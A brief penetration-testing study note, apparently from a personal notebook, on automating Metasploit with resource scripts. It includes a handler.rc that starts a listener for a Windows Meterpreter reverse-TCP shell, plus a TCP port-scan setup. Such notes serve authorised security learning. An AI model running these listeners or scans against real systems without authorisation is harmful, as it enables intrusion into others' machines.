---
up: "[[Client-Side Attacks]]"
---

# Automating Metasploit with Resources Scripts

- Metasploit resource scripts are a great feature of MSF that allows to automate repetitive tasks and commands
- They operate similarly to batch scripts

## Demonstration

- List of resource scripts:

```bash
ls -al /usr/share/metasploit-framework/scripts/resource
```

- Automation of multi/handler setup:

```bash
# handler.rc
use mutli/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <my_ip>
set LPORT <port>
run
```

```bash
msfconsole -r handler.rc
```

- Automation of a portscan:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip>
run
```

- Load a resource script

```bash
> resource ~/handler.rc
```

- Create resource script from msfconsole
- Last commands are automatically written inside

```bash
makerc ~/resouce.rc
```
